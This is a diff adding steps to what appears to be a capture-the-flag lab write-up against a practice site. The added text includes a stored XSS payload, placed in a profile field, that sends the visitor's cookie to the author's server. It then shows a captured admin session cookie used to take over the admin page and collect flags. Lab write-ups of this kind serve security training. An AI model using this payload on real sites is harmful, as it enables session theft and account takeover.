@@ -1273,5 +1273,18 @@ And host my php server with:
 
 `php -S 10.10.14.109:8000`
 
+Then I need to update the country field on my profile to:
+`<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>`
 
+Finally I visit the submit page with:
+`/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`
+
+And I got the cookie:
+`auth-session=s:CDV8IxXeuYY2D5TFUWWbZQ57fk_Cxm-G.bHuOA8JrWZoDBnAvL7Vx/ckOb0hcJhp3mIWmDGoRoIw`
+
+So now I can visit the admin page by just changing my cookie.
+
+Make the admins page public then click share and you find the first flag.
+
+Then just download the pcap file and find the flag.
 
